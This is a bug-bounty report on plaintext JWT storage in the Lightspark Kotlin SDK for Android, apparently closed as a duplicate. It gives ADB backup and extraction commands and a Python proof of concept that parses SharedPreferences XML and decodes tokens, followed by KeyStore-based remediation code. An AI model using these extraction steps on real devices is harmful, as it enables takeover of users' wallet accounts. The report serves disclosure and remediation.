@@ -1,0 +1,262 @@
+Insecure JWT Token Storage in Android SDK via SharedPreferences leads to authentication token extraction
+Duplicate of #3528964 Informative
+Duplicate title
+Plaintext JWT Storage in kotlin-sdk via SharedPreferences leads to Account Takeover through Android Backup
+Duplicate submitted at
+January 28, 2026, 6:21pm UTC
+Duplicate severity
+N/A
+Asset: SourceCode
+lightsparkdev/kotlin-sdk
+
+Insecure JWT Token Storage in Android SDK Exposes Authentication Tokens to Extraction
+ID: vuln-0004
+Severity: MEDIUM
+Found: 2026-01-29
+Target: /lightsparkdev/kotlin-sdk
+Endpoint: Android application storage
+Method: Local file system access
+CVSS: 6.0
+Summary
+The Lightspark Kotlin SDK's Android implementation stores JWT authentication tokens in plaintext within SharedPreferences and DataStore without encryption, allowing attackers with physical access or root privileges to extract tokens and compromise user accounts.
+The vulnerability exists in two storage implementations:
+SharedPrefsJwtStorage class stores JWT tokens in SharedPreferences with MODE_PRIVATE
+DataStoreJwtStorage class stores JWT tokens in Android DataStore
+Both storage mechanisms only provide filesystem isolation but no encryption. On rooted devices or through Android backup mechanisms, these tokens can be extracted, leading to persistent account access without requiring password or biometric authentication.
+The impact is significant because JWT tokens provide access to financial transactions and wallet operations within the Lightspark ecosystem.
+Steps To Reproduce
+Extract tokens from SharedPreferences:
+Root an Android device or use emulator with root access
+Install app using Lightspark SDK with authentication
+Authenticate to generate JWT token
+Access: /data/data/[package.name]/shared_prefs/jwtAuth.xml
+Parse XML to extract JWT token from jwtInfoJson field
+Extract tokens via ADB backup:
+Code
+•
+112 Bytes
+
+
+
+
+adb backup -noapk [package.name]
+dd if=backup.ab bs=24 skip=1 | openssl zlib -d > backup.tar
+tar -xvf backup.tar
+Extract app_shared_prefs_jwtAuth.xml from backup
+Use extracted token:
+Use curl or Postman to make authenticated requests to Lightspark API
+Token remains valid until expiration (typically hours or days)
+Supporting Material/References
+Proof of Concept Code demonstrates token extraction:
+Code
+•
+3.98 KiB
+
+
+
+
+#!/usr/bin/env python3
+"""
+Proof of Concept: JWT Token Extraction from Lightspark Android SDK
+
+This script demonstrates how JWT tokens can be extracted from
+insecurely stored SharedPreferences on rooted Android devices.
+"""
+
+import json
+import base64
+import xml.etree.ElementTree as ET
+from datetime import datetime
+
+def parse_shared_prefs_xml(xml_content):
+    """Parse SharedPreferences XML to extract JWT tokens"""
+    root = ET.fromstring(xml_content)
+    
+    tokens = []
+    for child in root:
+        if child.tag == 'string' and 'jwt' in child.attrib.get('name', '').lower():
+            try:
+                # Try to parse as JSON if it's JwtTokenInfo
+                token_info = json.loads(child.text)
+                if 'accessToken' in token_info:
+                    tokens.append({
+                        'type': 'JwtTokenInfo',
+                        'token': token_info['accessToken'],
+                        'valid_until': token_info.get('validUntil', 'Unknown')
+                    })
+            except json.JSONDecodeError:
+                # Might be raw JWT string
+                tokens.append({
+                    'type': 'RawJWT',
+                    'token': child.text
+                })
+    
+    return tokens
+
+def decode_jwt(token):
+    """Decode JWT token to view claims"""
+    try:
+        parts = token.split('.')
+        if len(parts) != 3:
+            return {"error": "Invalid JWT format"}
+        
+        # Decode payload
+        payload_b64 = parts[1]
+        # Add padding if needed
+        payload_b64 += '=' * (4 - len(payload_b64) % 4)
+        payload_json = base64.b64decode(payload_b64).decode('utf-8')
+        payload = json.loads(payload_json)
+        
+        return {
+            'header': json.loads(base64.b64decode(parts[0] + '==').decode('utf-8')),
+            'payload': payload,
+            'expires': datetime.fromtimestamp(payload.get('exp', 0)) if payload.get('exp') else 'No expiration'
+        }
+    except Exception as e:
+        return {"error": f"Failed to decode JWT: {str(e)}"}
+
+def demonstrate_exploit():
+    """Demonstrate the exploit workflow"""
+    print("=== Lightspark SDK JWT Extraction PoC ===\n")
+    
+    # Example extracted XML (simulated)
+    example_xml = """<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+<map>
+    <string name="jwtInfoJson">{"accessToken":"eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMzQ1NiIsImF1ZCI6Imh0dHBzOi8vYXBpLmxpZ2h0c3BhcmsuY29tIiwiaXNzIjoiaHR0cHM6Ly9hcHAubGlnaHRzcGFyay5jb20iLCJleHAiOjE3MzcwMTIzNDUsImlhdCI6MTcwNTQ3NjM0NSwianRpIjoiYWJjMTIzIn0.signature_here","validUntil":"2025-01-20T12:30:45Z"}</string>
+</map>"""
+    
+    print("1. Parsing SharedPreferences XML...")
+    tokens = parse_shared_prefs_xml(example_xml)
+    
+    for token_info in tokens:
+        print(f"\nFound {token_info['type']}:")
+        print(f"  Token: {token_info['token'][:50]}...")
+        
+        if 'valid_until' in token_info:
+            print(f"  Valid Until: {token_info['valid_until']}")
+        
+        print("\n2. Decoding JWT claims...")
+        decoded = decode_jwt(token_info['token'])
+        
+        if 'error' in decoded:
+            print(f"  Error: {decoded['error']}")
+        else:
+            print(f"  Algorithm: {decoded['header'].get('alg', 'Unknown')}")
+            print(f"  Subject: {decoded['payload'].get('sub', 'Unknown')}")
+            print(f"  Audience: {decoded['payload'].get('aud', 'Unknown')}")
+            print(f"  Expires: {decoded['expires']}")
+            print(f"  Issuer: {decoded['payload'].get('iss', 'Unknown')}")
+    
+    print("\n3. Exploitation Impact:")
+    print("   - Attacker can use extracted token for API calls")
+    print("   - Token grants full account access until expiration")
+    print("   - No re-authentication required")
+    print("   - Works even if user changes password")
+    
+    print("\n=== Remediation Required ===")
+    print("Store tokens encrypted using Android KeyStore or")
+    print("use hardware-backed encryption with device binding.")
+
+if __name__ == "__main__":
+    demonstrate_exploit()
+Vulnerable Files:
+/lightsparkdev/kotlin-sdk/wallet-sdk/src/androidMain/kotlin/com/lightspark/sdk/wallet/auth/jwt/SharedPrefsJwtStorage.kt
+/lightsparkdev/kotlin-sdk/wallet-sdk/src/androidMain/kotlin/com/lightspark/sdk/wallet/auth/jwt/DataStoreJwtStorage.kt
+/lightsparkdev/kotlin-sdk/androidwalletdemo/src/main/java/com/lightspark/androidwalletdemo/auth/CredentialsStore.kt
+Technical Analysis:
+The vulnerability stems from insecure storage of JWT tokens in Android's SharedPreferences and DataStore without encryption. While these storage mechanisms provide filesystem isolation through MODE_PRIVATE, they do not encrypt data at rest.
+Root Cause Analysis:
+SharedPrefsJwtStorage.kt (lines 9-50): Uses Context.MODE_PRIVATE which only restricts file access to the app but stores data in plain XML format. On rooted devices or through ADB backup, these files can be accessed.
+DataStoreJwtStorage.kt (lines 19-57): Uses Android DataStore which similarly stores preferences without encryption by default.
+CredentialsStore.kt (lines 19-52): Stores account credentials in DataStore without encryption.
+Security Gaps:
+No use of Android KeyStore for token encryption
+No implementation of encryption wrappers around stored tokens
+Tokens stored in serialized JSON format easily parseable if extracted
+Lack of binding tokens to device-specific hardware identifiers
+No token integrity verification before use
+Attack Vectors:
+Physical access to rooted device: Direct file system access to /data/data/[package]/shared_prefs/
+Malware with root privileges: Can read app data directories
+Insecure backups: Android backup mechanisms may include app data
+ADB backup exploitation: If backup encryption is weak or absent
+Impact:
+Successful exploitation allows attackers to:
+Extract valid JWT tokens from compromised Android devices
+Gain persistent unauthorized access to user accounts
+Perform financial transactions without user consent
+Bypass authentication mechanisms indefinitely (until token expiration)
+Access sensitive wallet operations and payment capabilities
+This vulnerability is particularly critical in the context of financial applications where authentication tokens grant access to monetary transactions. Attackers with physical device access (lost/stolen devices) or malware with root privileges can extract tokens and maintain access even after the legitimate user changes passwords, as JWT tokens are independent of password authentication.
+Remediation:
+Implement secure token storage with multiple defense layers:
+Encrypt JWT tokens using Android KeyStore:
+Code
+•
+747 Bytes
+
+
+
+
+class SecureJwtStorage(context: Context) : JwtStorage {
+    private val keyStore = KeyStore.getInstance("AndroidKeyStore")
+    private val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+    
+    init {
+        keyStore.load(null)
+        createKeyIfNeeded("jwt_encryption_key")
+    }
+    
+    override fun replace(state: JwtTokenInfo?) {
+        state?.let { encryptedState = encrypt(it) }
+        ?: clearEncryptedData()
+    }
+    
+    private fun encrypt(data: JwtTokenInfo): ByteArray {
+        val secretKey = getOrCreateSecretKey()
+        cipher.init(Cipher.ENCRYPT_MODE, secretKey)
+        val iv = cipher.iv
+        val encrypted = cipher.doFinal(serializerFormat.encodeToString(data).toByteArray())
+        return iv + encrypted
+    }
+}
+Implement device binding:
+Generate device-specific key using hardware-backed KeyStore
+Bind tokens to device hardware identifiers (with user consent)
+Include device fingerprint in token validation
+Use Android's EncryptedSharedPreferences:
+Code
+•
+356 Bytes
+
+
+
+
+val masterKey = MasterKey.Builder(context)
+    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
+    .build()
+
+val sharedPreferences = EncryptedSharedPreferences.create(
+    context,
+    "secure_jwt_storage",
+    masterKey,
+    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
+    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
+)
+Add token integrity verification:
+Include HMAC with KeyStore key
+Verify token integrity before use
+Reject tokens that fail integrity check
+Implement automatic token revocation:
+Detect suspicious device changes
+Force re-authentication on security events
+Server-side token invalidation capability
+Secure backup considerations:
+Exclude tokens from Android backups
+Use android:allowBackup="false" or backup rules
+Implement secure backup/restore flow with re-authentication
+Defense in depth:
+Biometric authentication for sensitive operations
+Short token expiration times
+Refresh token rotation with detection of reuse
+Logging and monitoring of token usage patterns
